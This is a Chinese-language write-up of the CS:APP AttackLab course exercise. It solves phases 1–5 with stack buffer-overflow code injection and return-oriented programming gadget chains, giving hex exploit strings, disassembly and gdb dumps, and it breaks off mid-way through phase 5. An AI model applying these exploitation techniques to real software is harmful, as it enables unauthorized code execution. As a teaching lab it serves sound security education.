# AttackLab
## 实验目标
通过缓冲区溢出攻击实现相关的功能，体会缓冲区溢出攻击的威力。
## 前置内容
### gdb
disas 指令可以用于查看某一段内存之间的指令
gdb中可以通过set args来设置启动参数(此实验需要附带-q参数才能正常运行二进制文件)
run指令可以直接指定启动参数
其余指令在前面的lab中有提及
### 大小端
intel系列处理器采用小端法，即低字节在低地址
### objdump
前面lab有提及，不再赘述
### 材料准备
<a href="">实验指导书</a>
<a href="">实验材料</a>
## 实验过程
### Code Injection Attacks
#### phase_1
对于Level1到Level3，在ctarget中是这样实现的。
利用test函数调用getbuf
```cpp
void test()
{
  int val;
  val = getbuf();
  printf("No exploit.Getbuf returned 0x%x\n", val);
}
```
而getbuf是这样实现的
```cpp
unsigned getbuf()
{
  char buf[BUFFER_SIZE];
  Gets(buf);
  return 1;
}
```
实验给出的二进制文件在编译阶段通过一定的选项跳过了对栈区的保护，来让此实验可以完成。而BUFFER_SIZE则是在编译阶段决定的。
在Level1中需要利用缓冲区溢出攻击，将getbuf给hack掉，返回到touch1函数，而不是test函数。
```cpp
void touch1()
{
  vlevel = 1;
  /* Part of validation protocol */
  printf("Touch1!: You called touch1()\n");
  validate(1);
  exit(0);
}
```
为了实现这一目的，首先objdump查看汇编源代码，找到getbuf部分.
```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq
  4017be:	90                   	nop
  4017bf:	90                   	nop
```
我们可以看到首先给%rdi分配了0x28大小的空间，这一部分就是给buf分配空间，然后传入gets函数，调用结束后释放空间准备返回。于是我们输入的字符串就应该超过这一大小，将放回指令覆盖掉，以达到返回至touch1函数的效果。
打上断点调试一下
```common
(gdb) x/30x $rsp
0x5561dc78:	0x33323130	0x00003534	0x00000000	0x00000000
0x5561dc88:	0x00000000	0x00000000	0x00000000	0x00000000
0x5561dc98:	0x55586000	0x00000000	0x00401976	0x00000000
0x5561dca8:	0x00000002	0x00000000	0x00401f24	0x00000000
0x5561dcb8:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
0x5561dcc8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dcd8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dce8:	0xf4f4f4f4	0xf4f4f4f4
```
我们可以看到0x00401976存储了返回的地址，这段地址在距离栈顶0x28的位置。由于x86体系采用小端法存储，所以低位会存储在低字节。那么也就是说，前面的0x28个位置都不重要了！重要的是后面0x8字节的位置。
所以直接构造这样一个字符串(利用实验给出的hex2raw)
```txt
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff c0 17 40 00 00 00 00 00
```
特别的，要注意大小端存放的顺序，注意实验指导书中使用hex2raw的例子。保存为level1.txt,进行实验.
```common
➜  target1 ./hex2raw<level1.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF C0 17 40 00 00 00 00 00
```
可以看到顺利通过了实验。
#### phase_2
实验2类似与实验１，给出了touch2函数的c实现。
```cpp
void touch2(unsigned val)
{
  vlevel = 2;/* Part of validation protocol */
  if (val == cookie) {
    printf("Touch2!: You called touch2(0x%.8x)\n", val);
    validate(2);
  } else {
    printf("Misfire: You called touch2(0x%.8x)\n", val);
    fail(2);
  }
  exit(0);
}
```
但与实验1不同的是，这个实验要求必须将cookies作为参数传入touch2。此实验的难点在于如何插入一段自己的代码。我们仔细观察一下getbuf的汇编代码，思考解决问题的办法。
```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq
  4017be:	90                   	nop
  4017bf:	90                   	nop
```
由于实验指导书中已经告诉我们，这个程序在编译阶段设置了一些参数来关闭了所有对溢出攻击的防护，于是我们猜测栈的地址是否没有随机化。通过gdb调试可以发现每一次%rsp的地址都是一致的
```common
rsp            0x5561dc78	0x5561dc78
```
既然栈的位置固定，那一切都简单了许多。首先我们通过gets将我们需要执行的代码输入到栈上，接着覆盖掉返回地址到栈对应位置，这样返回之后就会执行我们对应的代码，这样有个限制，那就是我们可执行的代码长度受到栈长度的限制，这里限制为0x28字节。 　
现在的问题就是这段代码是什么？很简单，首先我们要将cookies设置到%rdi上，接着我们需要返回到touch2上。第二个问题是cookies存储在什么位置?我们观察touch2的汇编代码
```asm
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```
发现cookies存储在0x202ce2(%rip)这个位置，那么一切都比较简单了，我们写出如下汇编代码
```asm
  movl 0x202ce2(%rip),%edi
  ret
```
而我们知道ret返回的地址存储在栈上，那么就得仔细的考虑栈指针的位置。我们可以将touch2的调用地址写在第一次返回(getbuf处)的地址之前，然后将getbuf的返回地址设置到栈的我们的代码的对应位置，在代码中将%rsp减掉对应的大小指向存储touch2地址的地址，这样就能实现传参调用的功能了,但这样过于复杂，其实直接用push将对应的地址压入栈即可。于是修改汇编代码如下($6044e4是从objdump的注释处得到的)
```asm
  movl $6044e4,%edi
  pushq $0x4017ec
  ret
```
利用gcc将这段汇编代码翻译成机器码(实验指导书附录B),得到
```asm
0000000000000000 <.text>:
   0:	48 8b 3c 25 e4 44 60 	mov    0x6044e4,%rdi
   7:	00
   8:	68 ec 17 40 00       	pushq  $0x4017ec
   d:	c3                   	retq
```
总共有0xb个字节，类似于实验１中我们可以写出这样的字节序列
```txt
48 8b 3c 25 e4 44 60 00 68 ec 17 40 00 c3 ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ec 17 40 00 00 00 00 00 78 dc 61 55 00 00 00 00
```
尝试运行，首先用hex2raw翻译成一串string，然后调用这串string，得到
```common
➜  target1 ./hex2raw<level2.txt >level2-raw.txt
➜  target1 ./ctarget -q <level2-raw.txt
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 8B 3C 25 E4 44 60 00 68 EC 17 40 00 C3 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF EC 17 40 00 00 00 00 00 78 DC 61 55 00 00 00 00
```
顺利通过
#### phase_3
实验3相比实验2又增加了一个要求，要求传入的不是cookie数字，而是一个cookie字符串,实验材料ctarget里面有一个hexmatch函数来进行比较
```cpp
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
  char cbuf[110];
  /* Make position of check string unpredictable */
  char *s = cbuf + random() % 100;
  sprintf(s, "%.8x", val);
  return strncmp(sval, s, 9) == 0;
}
void touch3(char *sval)
{
  vlevel = 3;
  /*Part of validation protocol */
  if (hexmatch(cookie,sval)) {
    printf("Touch3!:You called touch3(\"%s\")\n", sval);
    validate(3);
  } else {
    printf("Misfire:You called touch3(\"%s\")\n", sval);
    fail(3);
  }
  exit(0);
}
```
我们可以看到touch3接受一个字符串指针，而hexmatch则有两个参数val和sval，这个函数比较val和sval字符串表示的数字的值是否一致。　　　

**cookie对于每一个人都是一致的，没必要在代码中进行val到sval的转化，直接硬编码**
因为没看清这一点，浪费了大量的时间。接着我们看到实验报告的advice里面提到，在hexmatch中可能会对栈区进行一部分数值改变，要谨慎的选择存放的位置。那么我们直接来看一下到底哪一些部分被改变了！　　
打上断点首先看一下初始栈状况(hexmatch之前)
```common
0x5561dc88:	0x55685fe8	0x00000000	0x00000002	0x00000000
0x5561dc98:	0x00401916	0x00000000	0x55586000	0x00000000
0x5561dca8:	0x00000000	0x00000000	0x00401f24	0x00000000
0x5561dcb8:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
0x5561dcc8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dcd8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dce8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dcf8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dd08:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dd18:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dd28:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dd38:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dd48:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dd58:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dd68:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
```
改变之后我们看看
```common
0x5561dc00:	0xf7a71148	0x00007fff	0xf7dcfa00	0x00007fff
0x5561dc10:	0xf7dcc2a0	0x00007fff	0x5561dc78	0x00000000
0x5561dc20:	0x00000000	0x00000000	0x00000000	0x00000000
0x5561dc30:	0xf7a723f2	0x00007fff	0x5561dc78	0x00000000
0x5561dc40:	0x5561dc78	0x00000000	0x5561dca8	0x00000000
0x5561dc50:	0x00401a8a	0x00000000	0x55586000	0x00000000
0x5561dc60:	0x55685fe8	0x00000000	0x00000002	0x00000000
0x5561dc70:	0x004017b4	0x00000000	0x9f56c900	0x66cda64c
0x5561dc80:	0xf7dcfa00	0x00007fff	0x55685fe8	0x00000000
0x5561dc90:	0x00000002	0x00000000	0x00401916	0x00000000
0x5561dca0:	0x55586000	0x00000000	0x00000000	0x00000000
0x5561dcb0:	0x00401f24	0x00000000	0x00000000	0x00000000
0x5561dcc0:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dcd0:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x5561dce0:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
```
我们可以看到从0x5561dcc0开始的部分都是被保留没有改变的，而我们在getbuf处读入的栈区开始的地址是0x5561dc78，中间有72(0x40)个字节的距离，而之前我们栈区申请了0x28空间，返回地址存放在0x28-0x30这段空间，所以我们后面填充0x10个无效字节之后就能填充我们需要的字符串了。　　
现在我们来仔细考虑一下我们的字符串应该怎么构造。首先是代码部分，我们直接将0x5561dcc0这个地址赋值给%rdi，然后我们压入touch3的地址，用ret进行跳转，也就是
```asm
mov $0x5561dcc0,%rdi
push touch3
ret
```
接着，我们在0x28-0x30这段填入一个指向我们代码的地址，来让我们的代码能够得到执行。然后在0x40之后的地址填入cookie字符串。利用gcc和objdump我们得到
```
0000000000000000 <.text>:
   0:	48 c7 c7 c0 dc 61 55 	mov    $0x5561dcc0,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq
```
那么类似于实验２，我们首先得到前0x40的字符串的初始状态(hex2raw之前)
```txt
48 c7 c7 c0 dc 61 55 68 fa 18 40 00 c3 ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff 78 dc 61 55 00 00 00 00
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
```
接下来的位置就要存放cookie了，因为我的cookie是0x59b997fa,所以我应该构造的字符串是"0x59b997fa'\0'",注意一定要有末尾的'\0'，这代表了字符串的结束。然后是存放的位置，因为是小端法，所以直接写入(注意不含0x)
```txt
48 c7 c7 c0 dc 61 55 68 fa 18 40 00 c3 ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff 78 dc 61 55 00 00 00 00
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff 35 39 62 39 39 37 66 61
00 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
```
利用hex2raw转化之后执行，pass!
```common
➜  target1 ./hex2raw<level3.txt >level3-raw.txt
➜  target1 ./ctarget -q <level3-raw.txt
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 C0 DC 61 55 68 FA 18 40 00 C3 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 78 DC 61 55 00 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 35 39 62 39 39 37 66 61 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
```
#### 总结
CI部分的实验一开始实现起来比较困难，主要是卡在了大小端问题以及栈模型地址生长方向这些细节问题上，其实理清之后就是顺理成章的写出了对应的攻击串，也算是初步的体会了溢出攻击的威力。
### Return-Oriented Programming
#### phase_4
这一部分难度开始增加，注意到实验报告中提到
* It uses randomization so that the stack positions differ from one run to another. This makes it impos-
sible to determine where your injected code will be located.
* It marks the section of memory holding the stack as nonexecutable, so even if you could set the
program counter to the start of your injected code, the program would fail with a segmentation fault.
也就是说，在这一部分实验中，一方面因为栈随机化我们不太可能像之前一样通过设置返回地址到我们的代码部分来执行我们的代码，另一方面因为分块权限控制，栈上我们注入的代码也不会被执行，所以我们需要另外去找办法。
实验指导书上给出了另外一种思路，类似于这样的代码片段
```asm
0000000000400f15 <getval_210>:
  400f15:	c7 07 d4 48　89 c7  	mov    $0xc78948d4,(%rdi)
  400f1b:	c3                   	retq
```
这一类类似的片段以ret结尾(0xc3)而ret之前的一段片段截断后可以解释出不同的含义，比如这里的我们截断出48 89 c7则可以解释为movq %rax,%rdi,这类似的含义可以从实验指导书附录的3A中找到，那么我们可以利用这一些片段来实现一些功能，而他们末尾的ret也可以让我们实现在不同的片段之间去跳转。于是按照指示从start_farm到end_farm中去寻找这样的片段
```asm
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq

00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq

00000000004019e1 <setval_296>:
  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)
  4019e7:	c3                   	retq

00000000004019e8 <addval_113>:
  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
  4019ee:	c3                   	retq

00000000004019ef <addval_490>:
  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax
  4019f5:	c3                   	retq

00000000004019f6 <getval_226>:
  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
  4019fb:	c3                   	retq

00000000004019fc <setval_384>:
  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)
  401a02:	c3                   	retq

0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq

0000000000401a0a <setval_276>:
  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)
  401a10:	c3                   	retq

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq

0000000000401a18 <getval_345>:
  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  401a1d:	c3                   	retq

0000000000401a1e <addval_479>:
  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
  401a24:	c3                   	retq

0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	retq

0000000000401a2c <setval_248>:
  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)
  401a32:	c3                   	retq

0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq

0000000000401a39 <addval_110>:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	retq

0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	retq

0000000000401a47 <addval_201>:
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	retq

0000000000401a4e <getval_272>:
  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax
  401a53:	c3                   	retq

0000000000401a54 <getval_155>:
  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax
  401a59:	c3                   	retq

0000000000401a5a <setval_299>:
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	retq

0000000000401a61 <addval_404>:
  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
  401a67:	c3                   	retq

0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	retq

0000000000401a6e <setval_167>:
  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
  401a74:	c3                   	retq

0000000000401a75 <setval_328>:
  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)
  401a7b:	c3                   	retq

0000000000401a7c <setval_450>:
  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)
  401a82:	c3                   	retq

0000000000401a83 <addval_358>:
  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
  401a89:	c3                   	retq

0000000000401a8a <addval_124>:
  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
  401a90:	c3                   	retq

0000000000401a91 <getval_169>:
  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax
  401a96:	c3                   	retq

0000000000401a97 <setval_181>:
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	retq

0000000000401a9e <addval_184>:
  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
  401aa4:	c3                   	retq

0000000000401aa5 <getval_472>:
  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax
  401aaa:	c3                   	retq

0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	retq

0000000000401ab2 <end_farm>:
  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax
  401ab7:	c3                   	retq
  401ab8:	90                   	nop
  401ab9:	90                   	nop
  401aba:	90                   	nop
  401abb:	90                   	nop
  401abc:	90                   	nop
  401abd:	90                   	nop
  401abe:	90                   	nop
  401abf:	90                   	nop
```
现在要利用ROP来实现phase_2中的功能。那么我们就需要去把cookie放到%rdi中，然后覆盖掉对应的位置压入touch3的地址然后ret.
实验指导书中给出了Some Advice:
>* All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions start_farm and mid_farm.
>* You can do this attack with just two gadgets.
>* When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.

按照他给的建议，我们可以猜测这个实验可以这样进行。首先将一些需要用到的代码片段的addresses写在我们的string里面，然后通过溢出写到栈上。而我们知道pop会使得栈指针的地址增大，那么我们可以通过不断的pop和ret来在代码片段中跳转，最终实现我们需要的功能。
根据提示我们在start_farm到mid_farm中去寻找线索,我们首先注意到这个片段
```asm
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq
```
注意到58 90 c3这一段，其中90代表nop也就是表示什么都不做继续道下一行，而c3是ret,58是popq %rax,也就是说我们可以通过这一个片段把cookie写到rax中，那么我们还需要一个mov %rax,%rdi来把cookie写到%rax中,继续寻找发现了
```asm
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq
```
注意到48 89 c7是表示movq %rax,%rdi而紧跟着c3表示ret，恰好符合我们的要求，这样cookie我们就搞定了，只需要写好地址，算好偏移量，不断的通过pop来调整就能实现我们想要的结果。于是我们去查看getbuf
```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 ac 03 00 00       	callq  401b60 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq
  4017be:	90                   	nop
  4017bf:	90                   	nop
```
显然为我们的字符串分配了0x28大小的空间而我们知道栈的内存模型中栈顶是低地址，栈底是高地址。通过sub之后add会让栈指针回到原来的地址，然后这个位置指向的应该是存储的返回地址，而每一次pop都会让栈指针地址增大，则我们应该往上覆盖,也就是我们的需要跳转的地址应该写在后面。很轻易的我们就写出了这样的一串字符串
```txt
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00 ff ff ff ff ff ff ff ff
```
调用测试，pass!
```common
➜  target1 ./hex2raw <phase_4.txt >phase_4-raw.txt
➜  target1 ./rtarget -q <phase_4-raw.txt
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 FF FF FF FF FF FF FF FF
```
#### phase_5
这一部分的实验中则要求用ROP去完成phase_3，显然类似于当时的情况我们需要考虑存储的位置，然后把这个地址值赋给rdi,其实是和phase_4差不多的，只是我们把cookie换成了存储cookie的地址。但因为栈随机化技术，我们无法像phase_3中那样直接写入这个地址，于是我们需要想想办法。
我们注意到因为我们输入的字符串是可以控制的，那么我们存放字符串的位置相对于栈地址的偏移则是可以算出来的，既然如此我们可以先拿到%rsp,然后加上偏移地址得到字符串地址，接下来的就和phase_3一样了，只是需要采用ROP.这一次我们从start_farm看到end_farm。
```asm
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq
```
这一个片段中的48 89 e0可以实现mov %rsp,%rax的功能，因为要进行计算我们发现了这样一串有意思的片段
```asm
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq
```
这一串的意思是吧%rsi和%rdi加起来送到%rax中去,那么我们想到能不能把%rsp送到%rsi或者%rdi中，然后把偏移值送到另一个寄存器中，这样我们再去找找有没有把%rax送到%rdi中的指令.而根据前一个实验我们知道
```asm
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq
```
其中的48 89 c7能实现mov %rax,%rdi的功能,那么我们这个思路就是有实现可能的。我们先把%rsp送到%rax中，再把%rax送到%rdi中，这样就实现了把%rsp送到%rdi中的功能，于是我们只需要再把偏移值写到我们的字符串中，通过pop %rsi送到%rsi中，然后调用add_xy即可算出。于是我们再去寻找pop %rsi,但却一无所获，于是我们只能通过一些其他办法实现。我们将整个farm中所有可能的mov操作都列举出来，方便查看
```asm
00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq
```
89 c2实现了mov %eax,%edx
```asm
0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq
```
89 ce实现了％ecx,%esi
```asm
0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq
```
89 d1实现了mov %edx,%ecx，而后面的38 c9则是cmp指令，不改变值。到此，似乎我们已经可以实现我们想要的操作了，整理一下:
我们现在需要将偏移值送到%rsi中，首先通过pop %rax送到%rax中，然后通过mov %eax,%edx送到%edx中，然后通过mov %edx,%ecx送到%ecx中，最后通过mov %ecx,%esi送到%esi中，这里我们注意到偏移值在32位表示范围之内，所以我们这个思路应该是可以实现的。至于偏移值到底是多少，不如先留空最后再做决定，于是我们先得到这样一个字符串(hex2raw之前的):
```txt
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ab 19 40 00 00 00 00 00
00 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00
#rsp->06 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
00 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
```
其中全0的八个字节应该是我们需要的偏移量，现在我们来计算一下这个偏移量到底是多少,注意我标注为rsp那一个位置，哪一行的地址是将%rsp的值送到％rax,而我们字符串存放的位置在这一行地址之后还要0x20个字节，于是我们考虑偏移量为0x20
```txt
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ab 19 40 00 00 00 00 00
20 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00
